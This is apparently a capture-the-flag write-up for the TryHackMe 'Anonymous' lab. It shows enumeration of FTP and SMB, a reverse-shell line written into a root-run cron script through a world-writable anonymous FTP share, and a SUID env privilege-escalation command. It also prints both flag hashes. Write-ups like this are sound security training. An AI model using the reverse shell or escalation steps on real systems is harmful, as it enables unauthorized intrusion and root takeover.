---
title: TryHackMe - Anonymous
date: 2022-11-24 14:35:00 +0530
categories: [TryHackMe]
tags: [tryhackme, Medium]
---

-------

**Description :** Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.

Room : [https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)

Difficulty : Medium

Before starting the tests, adding the machine IP to `/etc/hosts` would help resolving IP to hostname as `anon.thm`

## Enumeration

Starting with Nmap scan.

```console
$ sudo nmap -Pn anon.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 07:06 EST
Nmap scan report for anon.thm (10.10.147.115)
Host is up (0.18s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds


$ sudo nmap -sC -sV -p21,22,139,445 anon.thm      
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 07:26 EST
Nmap scan report for anon.thm (10.10.147.115)
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.7.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-23T12:26:52
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-11-23T12:26:52+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.29 seconds
```
Now we can answer some of the questions.

| Enumerate the machine.  How many ports are open? | 4   |
| What service is running on port 21?              | FTP |
| What service is running on ports 139 and 445     | SMB |

Lets continue with enumerating **SMB** and **FTP** as anonymous login is allowed.

```console
$ smbclient -L \\anon.thm -N                          

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

$ smbclient //anon.thm/pics -c 'ls' -N                
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available
```
Nothing juicy in smb shares. Lets enumerate FTP by mounting it.

```console
$ mkdir /mnt/anon_ftp
$ sudo curlftpfs anonymous@anon.thm /mnt/anon_ftp
$ sudo -i
$ cd /mnt/anon_ftp
$ ls
scripts
$ cd scripts
$ ls -al
total 16
drwxrwxrwx 2 root root 4096 Jun  4  2020 .
drwxr-xr-x 1 root root 1024 Dec 31  1969 ..
-rwxr-xrwx 1 root root  314 Jun  4  2020 clean.sh
-rw-rw-r-- 1 root root 2494 Nov 24  2022 removed_files.log
-rw-r--r-- 1 root root   68 May 12  2020 to_do.txt
```

There are 3 files here. lets check whats in the files.

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
{: file='/mnt/anon_ftp/scripts/clean.sh'}

```
I really need to disable the anonymous login...it's really not safe
```
{: file='/mnt/anon_ftp/scripts/to_do.txt'}

```
Running cleanup script:  nothing to delete
```
{: file='/mnt/anon_ftp/scripts/removed_files.log'}


By checking the above files, we can come to some conclusions.
1. `clean.sh` is being executed as root by some cron job.
2. The execution results are logged into `removed_files.log`

## Initial Exploitation

we can place our exploitation code in `clean.sh` and **echo** that result into `removed_files.log`. It will get executed with root perms by cron job.

Simple commands did work, but the `netcat` on anon.thm machine could not establish a stable connection to my netcat listener. so we can use bash for this.

Start the netcat listener and Modify cleanup.sh to connect to our listener.

```bash
bash -i >& /dev/tcp/your_ip_here/1234 0>&1
```

After waiting for the cron job to run the script, we recieve a shell.

```console
$ whoami
namelessone
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
$ cat user.txt
90d6f992585815ff991e68748c414740
```
## Privilege Escalation

It is evident that we are part of **sudo** group.

I tried to run some commands, but some of them didnt seem to exist in the machine. so i resorted to using `linpeas.sh` and `LinEnum.sh`. Both of the outputs have one thing in common.
1. `namelessone` user is part of `lxd` group. A quick google search said we can escalate to **root** using this way, but i didnt choose this.
2. `/usr/bin/env` has **SUID** bit set.

From **GTFObins**, we can get an escalation using **env**. [Exploit](https://gtfobins.github.io/gtfobins/env/#suid)
```console
$ /usr/bin/env /bin/sh -p
$ whoami
root
$ cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

